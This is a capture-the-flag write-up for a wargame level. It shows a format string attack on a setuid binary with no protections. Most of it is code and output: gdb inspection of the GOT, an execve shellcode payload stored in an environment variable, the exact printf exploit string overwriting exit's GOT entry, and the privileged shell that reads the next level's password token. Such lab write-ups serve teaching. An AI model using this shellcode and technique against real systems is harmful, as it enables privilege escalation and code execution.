# level05

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

<hr>

## Solution

From the [disassembled binary](./source.s) and the [source](./source.c) code we can see that program uses vulnerable `printf` making format string attack possible.

```c
int main() {
    ...
    char buf[100];
    fgets(buf, 100, stdin);
    ...
    printf(buf);
    exit(0);
}
```

It is clear that the best way here will be to use format attack to rewrite `exit` address in GOT.

First, we need to get address of `exit@plt`:
```bash
(gdb) p exit
$1 = {<text variable, no debug info>} 0x8048370 <exit@plt>
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
```

Adding shellcode to env:
```bash
export PAYLOAD=$'\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
```

Getting the address of the shellcode:
```c
(gdb) b main
(gdb) r
(gdb) x/1000s environ
...
0xffffdf8c:      "PAYLOAD=\220\220\220\220j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
...
(gdb) x/100bx 0xffffdf8c
0xffffdf8c:     0x50    0x41    0x59    0x4c    0x4f    0x41    0x44    0x3d
0xffffdf94:     0x90    0x90    0x90    0x90    0x6a    0x0b    0x58    0x99
0xffffdf9c:     0x52    0x66    0x68    0x2d    0x70    0x89    0xe1    0x52
0xffffdfa4:     0x6a    0x68    0x68    0x2f    0x62    0x61    0x73    0x68
0xffffdfac:     0x2f    0x62    0x69    0x6e    0x89    0xe3    0x52    0x51
0xffffdfb4:     0x53    0x89    0xe1    0xcd    0x80    0x00    0x4c    0x45
...
```

The `0xffffdf94` is too large when writing it through `printf` and not working, that's why we need to pass it separately, by 2 bytes.

The idea is to place both addresses on the stack and write `0xdf94` and `0xffff`. We should also remember that our 2 addresses take 8 bytes.
```bash
$((0xffff - 0xdf94))
8299: command not found
$((0xdf94))
57236: command not found    <- subtract 8 bytes from this value as it comes first
```

As the array is located on `ESP+0x28` and the buffer passed to `printf` is on `ESP`, position of the first argument will be at <br>
0x28 / 0x4 bytes per stack argument = 40 / 4 = `10`th argument.

Exploit!
```bash
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57228c%10$hn" + "%8299c%11$hn"' > /tmp/l5

cat /tmp/l5 - | ./level05
```

Getting token:
```bash
whoami
level06
cd ../level06
ls -la
total 17
dr-xr-x---+ 1 level06 level06   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level06 level06  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level06 level06 3533 Sep 10  2016 .bashrc
-rw-r--r--+ 1 level06 level06   41 Oct 19  2016 .pass
-rw-r--r--  1 level06 level06  675 Sep 10  2016 .profile
-rwsr-s---+ 1 level07 users   7907 Sep 10  2016 level06
cat .pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## References
- [The video, that explains solution to almost the same problem](https://www.youtube.com/watch?v=t1LH9D5cuK4)
- [GOT and PLT](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
